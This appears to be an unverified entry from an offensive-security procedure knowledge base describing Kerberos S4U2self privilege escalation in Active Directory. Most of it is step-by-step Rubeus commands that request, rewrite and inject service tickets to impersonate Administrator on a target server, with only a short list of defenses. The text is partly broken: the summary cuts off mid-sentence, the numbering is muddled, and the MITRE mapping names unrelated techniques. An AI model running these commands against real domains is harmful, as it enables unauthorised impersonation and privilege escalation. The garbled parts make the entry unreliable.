---
id: c0af0ec2-f3ca-46b7-a8aa-da72e8b48abe
name: Kerberos S4U2self Privilege Escalation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:07.868347+00:00'
updated_at: '2023-04-10T20:36:07.923398+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]'
sub_techniques:
- '[[AS-REP Roasting|T1558.004 - AS-REP Roasting]]'
- '[[Kerberoasting|T1558.003 - Kerberoasting]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Kerberos Service for User Extension]]'
- '[[S4U2self - Privilege Escalation]]'
commands:
- '[[Execute Rubeus s4u command]]'
- '[[Modify TGS ciphered data using Rubeus tgssub command]]'
- '[[Rubeus ptt with base64ticket]]'
- '[[Rubeus s4u impersonation with base64ticket]]'
- '[[Rubeus s4u impersonation with base64ticket and ptt]]'
---

# Kerberos S4U2self Privilege Escalation

## Summary

Kerberos S4U2self Privilege Escalation is a technique used to obtain a Service Ticket for a user without having their password. This technique can be used to elevate privileges in the Active Directory environment. By abusing the S4U2self feature, an attacker can request a Service Ticket for a user 

## Description

# Description

Kerberos S4U2self Privilege Escalation is a technique used to obtain a Service Ticket for a user without having their password. This technique can be used to elevate privileges in the Active Directory environment. By abusing the S4U2self feature, an attacker can request a Service Ticket for a user and impersonate them to access resources they are authorized to access. This technique is commonly used by attackers to move laterally within the network and gain access to sensitive information.

To execute this attack, the attacker needs to have already obtained the user's TGT. The attacker then uses the Rubeus tool to generate a S4U2self Service Ticket for the user. With this Service Ticket, the attacker can access resources that the user has access to, and potentially escalate privileges.

The business value of this attack is that it allows an attacker to gain access to sensitive data and systems within the organization, potentially causing significant harm.

## Requirements

1. Access to the user's TGT

1. Rubeus tool

## Defense

1. Implementing the principle of least privilege can limit the damage that can be done with this technique.

1. Implementing proper network segmentation can limit the attacker's ability to move laterally within the network.

1. Monitoring for anomalous activity such as the generation of S4U2self Service Tickets can help detect and respond to this attack.

## Objectives

1. Obtain a Service Ticket for a user without having their password

1. Impersonate the user to access resources they are authorized to access

1. Move laterally within the network

1. Potentially escalate privileges

# Instructions

1. To obtain a Service Ticket as a domain admin for the machine, run the following commands:
1. Use Rubeus to make a S4U2self request:
Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"base64ticket"
2. Pass the obtained ticket to Rubeus to acquire a Service Ticket:
Rubeus.exe ptt /ticket:"base64ticket"
3. Use the obtained Service Ticket to make a S4U2self request again:
Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt

**Code**: [[Rubeus.exe s4u /self /nowrap /impersonateuser:"Adm]]

> The provided commands demonstrate how to use Rubeus to obtain a Service Ticket as domain admin for the machine. The first command makes a S4U2self request using the provided TGT to obtain a Service Ticket for the specified service. The obtained ticket is then passed to Rubeus to acquire a Service Ticket. Finally, the obtained Service Ticket is used to make a S4U2self request again to obtain the necessary privileges for the specified service.

**Command** ([[Rubeus s4u impersonation with base64ticket]]):

```bash
Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"base64ticket"
```

**Command** ([[Rubeus ptt with base64ticket]]):

```bash
Rubeus.exe ptt /ticket:"base64ticket"
```

**Command** ([[Rubeus s4u impersonation with base64ticket and ptt]]):

```bash
Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt
```

2. To generate an S4U2Self ticket using Rubeus, run the following commands:
1. Rubeus.exe s4u /user:<computerAccount> /msdsspn:cifs/<computerDNS> /impersonateuser:<localAdmin> /ticket:<TGT> /nowrap
2. Rubeus.exe tgssub /ticket:<ticket> /altservice:cifs/<ServerDNSName> /ptt

**Code**: [[# The Rubeus execution will fail when trying the S]]

> The above commands use Rubeus to generate a service for user (S4U) ticket for the current user's computer account. The S4U2Self ticket allows the user to impersonate any user to themselves. The first command generates the ticket and the second command substitutes the service name in the ticket with the specified alternate service name, and then injects the ticket into the current logon session (Pass-the-Ticket).

**Command** ([[Execute Rubeus s4u command]]):

```bash
Rubeus.exe s4u /user:${computerAccount} /msdsspn:cifs/${computerDNS} /impersonateuser:${localAdmin} /ticket:${TGT} /nowrap
```

**Command** ([[Modify TGS ciphered data using Rubeus tgssub command]]):

```bash
Rubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]

### Sub-Techniques

- [[AS-REP Roasting|T1558.004 - AS-REP Roasting]]
- [[Kerberoasting|T1558.003 - Kerberoasting]]

## Commands Used

- [[Execute Rubeus s4u command]]
- [[Modify TGS ciphered data using Rubeus tgssub command]]
- [[Rubeus ptt with base64ticket]]
- [[Rubeus s4u impersonation with base64ticket]]
- [[Rubeus s4u impersonation with base64ticket and ptt]]

## Tags

- [[Active Directory Attacks]]
- [[Kerberos Service for User Extension]]
- [[S4U2self - Privilege Escalation]]
